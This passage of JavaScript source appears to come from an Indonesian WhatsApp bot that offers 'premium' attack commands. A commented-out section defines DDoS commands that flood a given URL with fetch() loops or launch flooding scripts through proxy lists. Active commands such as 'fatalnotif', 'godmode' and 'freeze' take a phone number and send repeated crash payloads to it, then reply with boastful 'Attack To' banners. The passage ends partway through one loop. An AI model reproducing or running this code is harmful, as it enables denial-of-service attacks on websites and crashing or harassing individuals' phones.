reply(`${meg.result}`)
}
break
/*case 'dos': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1] * 1000
			if (args.length === 2 && url && !isNaN(time)) {
				let attack = () => {
					let totalRequests = 0
					let threads = []
					for (let j = 0; j < 6; j++) {
						threads.push(
							new Promise((resolve, reject) => {
								let interval = setInterval(() => {
									for (let j = 0; j < 100; j++) {
										fetch(url)
											.then(() => {
												totalRequests++
												console.log(`Attacking => ${url} Total Requests: ${totalRequests} Duration: ${time}`)
											})
											.catch(err => {})
									}
								}, 750)
								setTimeout(() => {
									clearInterval(interval)
									resolve()
								}, time)
							})
						)
					}

					Promise.all(threads)
						.then(() => console.log("Attack Complete"))
						.catch(err => console.error("Error In Attack:", err))
				}

				attack()
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format: Dos [Url] [Time]`)
			}
		}
		break
		case 'ddos': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Ddos [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'xc': {
			if (!isPremium) return reply(mess.only.premium);
			let [url, time, rate, thread, proxyFile] = q.split(" ");
			if (args.length === 5 && url && time && rate && thread && proxyFile) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju: ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/LC.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString());
					if (stdout) return console.log(util.format(stdout));
				});
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format: Xc [Url] [Time] [Rate] [Thread] [ProxyFile]`);
			}
		}
		break
		case 'mix': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'floods': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'ua': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'xchrome': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tls': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tlsbypass': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tlsv2': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'bypass-cf': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]`)
			}
		}
		break
		case 'tls-vip': {
			if (!isPremium) return reply(mess.only.premium)
			let url = q.split(" ")[0]
			let time = q.split(" ")[1]
			let thread = q.split(" ")[2]
			let rate = q.split(" ")[3]
			if (args.length === 4 && url && time && thread && rate) {
				m.reply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
				exec(`node ./database/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
					if (err) return console.log(err.toString())
					if (stdout) return console.log(util.format(stdout))
				})
			} else {
				m.reply(`Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]`)
			}
		}
		break*/
		//END DDOS\\
case 'fatalnotif': case 'fatalui': case 'crashtotal': case 'wantedssql': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 ᴀᴅᴀ ᴘᴀɴɴᴏғғɪᴄɪᴀʟ ᴊᴀɴɢᴀɴ ʟᴀʀɪ 彡

💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 𝟐.𝟎 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 𝚙𝚊𝚗𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝙻 ] 🥶🥵`)
}
break

case 'godmode': case 'darksistem': case 'bapakkau': case 'wantedssql': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 ᴀᴅᴀ ᴘᴀɴɴᴏғғɪᴄɪᴀʟ ᴊᴀɴɢᴀɴ ʟᴀʀɪ 彡

💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 𝟐.𝟎 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 𝚙𝚊𝚗𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝙻 ] 🥶🥵`)
}
break	

case 'otw-gasih': case 'force-close': case 'siap-bang': case 'heker': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 ᴀᴅᴀ ᴘᴀɴɴᴏғғɪᴄɪᴀʟ ᴊᴀɴɢᴀɴ ʟᴀʀɪ 彡

💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 𝟐.𝟎 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 𝚙𝚊𝚗𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝙻 ] 🥶🥵`)
}
break

case 'freeze': case 'bodo-amat': case 'izin-bang': case 'halodek': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 ᴀᴅᴀ ᴘᴀɴɴᴏғғɪᴄɪᴀʟ ᴊᴀɴɢᴀɴ ʟᴀʀɪ 彡

💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 𝟐.𝟎 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 𝚙𝚊𝚗𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝙻 ] 🥶🥵`)
}
break

case 'siapa-lu': case 'apa-sih': case 'caper': case 'ga-asik': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
reply(bugres)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 ᴀᴅᴀ ᴘᴀɴɴᴏғғɪᴄɪᴀʟ ᴊᴀɴɢᴀɴ ʟᴀʀɪ 彡

💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 𝟐.𝟎 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 𝚙𝚊𝚗𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝙻 ] 🥶🥵`)
}
break

case 'anjay-alok': case 'jangan-bang': case 'tolol-lu': case 'yatim-lu': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Example: ${prefix + command} 62×××`)
let target = bijipler + '@s.whatsapp.net'
reply(bugres)
await reply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
